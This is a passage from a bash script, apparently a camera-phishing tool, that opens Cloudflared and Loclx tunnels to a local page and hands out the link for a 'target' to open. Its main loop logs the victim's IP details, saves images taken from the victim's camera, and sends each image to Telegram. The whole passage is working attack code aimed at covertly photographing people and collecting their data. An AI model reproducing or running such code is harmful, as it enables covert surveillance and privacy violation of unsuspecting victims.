        loclxlink=$(grep -o "[-0-9a-z.]*.loclx.io" "$tunneler_dir/loclx.log" | head -n1)
    fi
    if ! [ -z "$loclxlink" ]; then
        loclxcheck=true
        loclxlink="https://${loclxlink}"
        break
    fi
    sleep 1
done
# Wait until the tunnel actually responds (not 502 / 521 / 000) and probe it like a real browser
if $cfcheck; then
    echo -e "${info2}Checking tunnel reachability....\n"
    ua_probe="Mozilla/5.0 (Linux; Android 13; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36"
    page_code=000
    for second in $(seq 1 12); do
        code=$(curl -s -o /dev/null -w %{http_code} --max-time 4 "${cflink}" 2>/dev/null)
        if [ "$code" != "502" ] && [ "$code" != "521" ] && [ "$code" != "000" ]; then
            page_code=$(curl -s -o /dev/null -w %{http_code} -L --max-time 15 -A "$ua_probe" "${cflink}" 2>/dev/null)
            break
        fi
        sleep 2
    done
    if [ "$page_code" = "200" ]; then
        echo -e "${success}Link is LIVE and serving the page (HTTP 200 OK).${nc}"
    elif [ "$page_code" != "000" ] && [ "$page_code" != "" ]; then
        echo -e "${yellow}[!] Tunnel answers HTTP ${page_code} for browsers - if victims see a Cloudflare error page, restart the run or use Loclx.${nc}"
    fi
fi
if ( $cfcheck && $loclxcheck ); then
    echo -e "${success}Cloudflared and Loclx have started successfully!\n"
    url_manager "$cflink" 1 2
    url_manager "$loclxlink" 3 4
elif ( $cfcheck && ! $loclxcheck ); then
    echo -e "${success}Cloudflared has started successfully!\n"
    url_manager "$cflink" 1 2
elif ( $loclxcheck && ! $cfcheck ); then
    echo -e "${success}Loclx has started successfully!\n"
    url_manager "$loclxlink" 1 2
else
    echo -e "${error}Tunneling failed! Start your own port forwarding/tunneling service at port ${PORT}\n";
    if $termux; then
        echo -e "${yellow}[!] If this is a TLS certificate error, fix it on Termux:${nc}"
        echo -e "${info}  Run:  ${bright_blue}pkg install -y ca-certificates${nc}"
        echo -e "${info}  Then: ${bright_blue}bash hema.sh${nc}"
    fi
    if [[ -f "$tunneler_dir/cf.log" ]]; then
        echo -e "${info2}Last cloudflared output:\n${gray}"
        tail -n 15 "$tunneler_dir/cf.log"
        echo -e "${nc}"
    fi
fi
sleep 1
rm -rf ip.txt
echo -e "${info}Waiting for the target...${nc}"
if [[ -n "$cflink" ]]; then
    echo -e "  ${green}● Test it now: open this in any browser -> ${bright_blue}${cflink}${nc}"
fi
if [[ -n "$loclxlink" ]]; then
    echo -e "  ${green}● Alternate link -> ${bright_blue}${loclxlink}${nc}"
fi
echo -e "${dim}  Everything the target does will appear below. Keep this terminal open!\n${nc}"
wait_count=0
while true; do
    wait_count=$(( wait_count + 1 ))
    if [[ -e "ip.txt" ]]; then
        echo -e "\007${success}Target opened the link!\n"
        while IFS= read -r line; do
            echo -e "${green}[${blue}*${green}]${yellow} $line"
        done < ip.txt
        echo ""
        cat ip.txt >> "$cwd/ip.txt"
        rm -rf ip.txt
    fi
    sleep 0.5
    if [[ -e "errlog.txt" ]]; then
        echo -e "\007${error}Target camera failed:\n"
        while IFS= read -r line; do
            echo -e "${orange}[•] ${yellow}$line"
        done < errlog.txt
        echo ""
        rm -rf errlog.txt
    fi
    sleep 0.5
    if [[ -e "log.txt" ]]; then
        echo -e "\007${success}Image downloaded!\n"
        for file in *.png; do
            [ -f "$file" ] || continue
            mv -f "$file" "$FOL" 2>/dev/null
            if [ -f "$FOL/$file" ]; then
                echo -e "${info2}Saved: ${green}${FOL}/${file}${nc}"
                tg_send "$FOL/$file"
                echo -e "${success}Sent a copy to Telegram${nc}"
                if command -v termux-media-scan > /dev/null 2>&1; then
                    termux-media-scan "$FOL/$file" > /dev/null 2>&1 &
                    termux-media-scan "$FOL" > /dev/null 2>&1 &
                    echo -e "${success}Added to phone gallery${nc}"
                fi
            fi
        done
        rm -rf log.txt
    fi
    sleep 0.5
    if (( wait_count % 40 == 0 )); then
        if command -v pgrep > /dev/null 2>&1 && ! pgrep -f cloudflared > /dev/null 2>&1; then
            echo -e "\n${error}WARNING: The tunnel process died - the link no longer works!\007${nc}"
            echo -e "${info2}Press ${red}Ctrl + C ${info2}and run ${bright_blue}bash hema.sh${info2} again.\n${nc}"
        fi
    fi
done

